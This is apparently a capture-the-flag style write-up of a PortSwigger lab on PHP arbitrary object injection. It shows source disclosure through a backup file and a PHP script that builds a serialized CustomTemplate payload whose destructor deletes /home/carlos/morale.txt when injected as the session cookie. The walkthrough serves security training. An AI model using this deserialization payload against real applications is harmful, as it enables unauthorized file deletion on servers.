# Arbitrary object injection in PHP

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php), you'll learn: Arbitrary object injection in PHP! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110065946.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110065958.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110070015.png)

When we successfully logged in, it'll set a new session cookie.

**URL decoded:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6eTlwcGwxMXF0c3FpZWR6N2h3bWZiamR3eWdlcDUxZiI7fQ==
```

As you can see, the session cookie's last 2 characters are `=`, which is base64's padding character.

**Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6eTlwcGwxMXF0c3FpZWR6N2h3bWZiamR3eWdlcDUxZiI7fQ==' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zy9ppl11qtsqiedz7hwmfbjdwygep51f";}
```

**Also, in the Burp Suite's site map, I found there is a PHP file called `CustomTemplate.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110070752.png)

**Let's send that request to Burp Suite Repeater:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110070822.png)

In here, we can try to read the source code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110070843.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110070855.png)

The `~` worked!

**`/libs/CustomTemplate.php`:**
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

**The PHP comment looks sussy:**
```php
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```

In here, we see the `CustomTemplate` class has a magic method called `__destruct`. This method will the `unlink()` method on the `local_file_path` attribute, which will then delete the file on `$template_file_path.lock`.

But how can we abuse that?

**The `__destruct` magic method will be automatically called.**

**That being said, we can add the `CustomTemplate` object to the serialized PHP object, which will then delete `morale.txt` file from Carlos's home directory!**
```php
<?php
    class CustomTemplate
    {
        function __construct()
        {
            $this->lock_file_path = "/home/carlos/morale.txt";
        }
    }

    $CustomTemplate = new CustomTemplate;
    $serializedCustomTemplate = serialize($CustomTemplate);

    echo "[+] Serialized: \n";
    var_dump($serializedCustomTemplate);

    echo "[+] Base64 encoded: \n" . base64_encode($serializedCustomTemplate);
?>
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# php serialization.php
[+] Serialized: 
string(79) "O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}"
[+] Base64 encoded: 
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

**Now, we can copy the base64 encoded string, and paste it to the session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110072858.png)

**Then refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-4/images/Pasted%20image%2020230110072914.png)

Nice!

# What we've learned:

1. Arbitrary object injection in PHP